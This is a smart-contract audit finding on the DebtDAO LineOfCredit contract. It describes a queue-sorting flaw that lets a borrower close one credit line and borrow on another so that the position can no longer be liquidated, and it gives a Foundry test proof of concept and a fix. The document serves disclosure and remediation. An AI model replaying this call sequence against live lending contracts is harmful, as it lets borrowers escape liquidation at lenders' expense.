## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- sponsor confirmed
- selected for report
- H-05

# [Borrower can craft a borrow that cannot be liquidated, even by arbiter. ](https://github.com/code-423n4/2022-11-debtdao-findings/issues/421) 

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538


# Vulnerability details

## Description

LineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\[0\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\[0\] before other credit lines. 

The list is managed by several functions:

1.  CreditListLib.removePosition - deletes parameter id in the ids array
2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element
3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:
    1.  target index is not empty
    2.  there is no principal owed for the target index's credit

The idea I had is that if we could corrupt the ids array so that ids\[0\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. 

```
modifier whileBorrowing() {
    if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }
    _;
}
```

It turns out there is a simple sequence of calls which allows borrowing while ids\[0\] is deleted, and does not re-arrange the new borrow into ids\[0\]!

1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array.
2.  id2 = addCredit() - called again, ids.length = 2
3.  close(id1) - calls removePosition() on id1, now ids array is \[0x000000000000000000000000, id2 \]
4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).

From this sequence, we achieve a borrow while ids\[0\] is 0! Therefore, credits\[ids\[0\]\].principal = credits\[0\].principal = 0, and whileBorrowing() reverts.

The impact is massive - the following functions are disabled:

- SecureLine::liquidate()
- LineOfCredit::depositAndClose()
- LineOfCredit::depositAndRepay()
- LineOfCredit::claimAndRepay()
- LineOfCredit::claimAndTrade()

## Impact

Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.

## Proof of Concept

Copy the following code into LineOfCredit.t.sol

```
function _addCreditLender2(address token, uint256 amount) public {
    // Prepare lender 2 operations, does same as mintAndApprove()
    address lender2 = address(21);
    deal(lender2, mintAmount);
    supportedToken1.mint(lender2, mintAmount);
    supportedToken2.mint(lender2, mintAmount);
    unsupportedToken.mint(lender2, mintAmount);
    vm.startPrank(lender2);
    supportedToken1.approve(address(line), MAX_INT);
    supportedToken2.approve(address(line), MAX_INT);
    unsupportedToken.approve(address(line), MAX_INT);
    vm.stopPrank();
    // addCredit logic
    vm.prank(borrower);
    line.addCredit(dRate, fRate, amount, token, lender2);
    vm.stopPrank();
    vm.prank(lender2);
    line.addCredit(dRate, fRate, amount, token, lender2);
    vm.stopPrank();
}
function test_attackUnliquidatable() public {
    bytes32 id_1;
    bytes32 id_2;
    _addCredit(address(supportedToken1), 1 ether);
    _addCreditLender2(address(supportedToken1), 1 ether);
    id_1 =  line.ids(0);
    id_2 =  line.ids(1);
    hoax(borrower);
    line.close(id_1);
    hoax(borrower);
    line.borrow(id_2, 1 ether);
    id_1 =  line.ids(0);
    id_2 = line.ids(1);
    console.log("id1 : ", uint256(id_1));
    console.log("id2 : ", uint256(id_2));
    vm.warp(ttl+1);
    assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);
    vm.expectRevert(ILineOfCredit.NotBorrowing.selector);
    bool isSolvent = line.declareInsolvent();
}
```

## Tools Used

Manual audit

## Recommended Mitigation Steps

When sorting new borrows into the ids queue, do not skip any elements.